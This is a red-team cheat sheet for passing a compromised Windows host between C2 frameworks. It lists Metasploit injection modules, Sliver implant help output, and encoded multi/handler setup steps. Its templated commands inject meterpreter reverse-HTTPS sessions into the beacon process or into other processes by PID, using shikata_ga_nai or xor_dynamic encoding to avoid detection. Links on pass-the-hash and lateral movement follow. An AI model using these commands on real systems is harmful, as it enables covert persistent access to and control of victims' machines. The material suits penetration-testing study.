# Switching Callbacks

## 01 - Metasploit

TODO: Go through every MSF module

use post/windows/manage/exec_powershell

post/windows/manage/multi_meterpreter_inject

exploit/windows/local/payload_inject

post/windows/manage/shellcode_inject

post/windows/manage/reflective_dll_inject

## 02 - Sliver

### 2.1 - Help Menu

```
sliver (IMPLANT_NAME) > msf -h

Command: msf [--lhost] <options>
About: Execute a metasploit payload in the current process.

Usage:
======
  msf [flags]

Flags:
======
  -e, --encoder    string    msf encoder
  -h, --help                 display help
  -i, --iterations int       iterations of the encoder (default: 1)
  -L, --lhost      string    listen host
  -l, --lport      int       listen port (default: 4444)
  -m, --payload    string    msf payload (default: meterpreter_reverse_https)
  -t, --timeout    int       command timeout in seconds (default: 60)

sliver (IMPLANT_NAME) > msf-inject -h

Command: inject [--pid] [--lhost] <options>
About: Execute a metasploit payload in a remote process.

Usage:
======
  msf-inject [flags]

Flags:
======
  -e, --encoder    string    msf encoder
  -h, --help                 display help
  -i, --iterations int       iterations of the encoder (default: 1)
  -L, --lhost      string    listen host
  -l, --lport      int       listen port (default: 4444)
  -m, --payload    string    msf payload (default: meterpreter_reverse_https)
  -p, --pid        int       pid to inject into (default: -1)
  -t, --timeout    int       command timeout in seconds (default: 60)
```

### 2.2 - Usage

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload <payload>

msf exploit(multi/handler) > set EnableStageEncoding true

msf exploit(multi/handler) > set StageEncoder <x86/shikata_ga_nai | x64/xor_dynamic>

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run
```

Inject meterpreter session directly in the same beacon process

`sliver (IMPLANT_NAME) > msf [-e <x86/shikata_ga_nai | x64/xor_dynamic>] -i <iterations> -L <IP> -l <PORT> -m <payload>`

Inject meterpreter session through another process

`sliver (IMPLANT_NAME) > msf-inject -p <pid> -e [x86/shikata_ga_nai | x64/xor_dynamic] -i <iterations> -L <IP> -l <PORT> -m <payload>`

## References

- [Lateral Movement Pass the Hash Attack](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)

- [Pentestlab Powershell Remoting](https://pentestlab.blog/tag/powershell-remoting/)

- [Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

- [Wadcoms](https://wadcoms.github.io/)

- [Getting the bacon from Cobalt Strike Beacon](https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/)

- [RCE on Windows From Linux Part 1 Impacket](https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/)

- [CertCube Pass the Hash in Windows 10](https://blog.certcube.com/pass-the-hash-in-windows-10/)